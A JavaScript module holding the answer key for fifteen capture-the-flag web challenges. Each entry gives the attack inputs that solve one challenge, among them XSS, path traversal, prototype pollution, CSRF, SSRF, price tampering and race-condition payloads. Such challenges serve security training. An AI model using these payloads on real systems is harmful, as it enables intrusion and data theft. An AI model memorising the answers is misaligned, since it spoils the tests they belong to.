export const ctfSolutions = {
  'ctf-social-draft': [{ postId: '42' }],
  'ctf-meeting-guest': [{ roomId: 'BLVD101', role: 'host' }],
  'ctf-shop-price': [{ sku: 'starter-kit', price: '1', quantity: '1' }],
  'ctf-blog-preview': [{ content: '<svg onload=alert(1)>' }],
  'ctf-files-backup': [{ filename: '../backup/launch.txt' }],
  'ctf-support-ticket': [{ ticketId: '702', tenant: 'operations', includeInternal: 'true' }],
  'ctf-video-manifest': [{ asset: 'staff-onboarding', previewHeader: '1' }],
  'ctf-travel-coupon': [{ trip: 'city-escape', coupons: 'WELCOME,welcome,Welcome' }],
  'ctf-recruit-resume': [
    { filename: 'resume.svg.png', mime: 'image/svg+xml', content: '<svg onload=alert(1)>' },
  ],
  'ctf-bank-transfer': [
    { amount: '25', origin: 'https://postcard.invalid', contentType: 'text/plain', csrfToken: '' },
  ],
  'ctf-devops-build': [
    { buildId: '811', debug: 'true' },
    { buildId: '811', artifact: '../release/launch.txt' },
  ],
  'ctf-health-record': [
    { operation: 'schema' },
    {
      operation: 'batch',
      alias: 'publicSearch:adminRecord',
      patientId: 'R-204',
      organization: 'west',
    },
  ],
  'ctf-design-export': [
    { projectJson: '{"__proto__":{"canExport":true}}' },
    { exportPath: 'private/brand-kit.svg' },
  ],
  'ctf-course-replay': [
    { revision: 'R6' },
    { revision: 'R6', confirmations: 'R6,R6', dispatch: 'parallel' },
  ],
  'ctf-music-hook': [
    { connector: 'diagnostics' },
    { hookUrl: 'https://hooks.echoroom.invalid@metrics.internal/flag' },
  ],
};
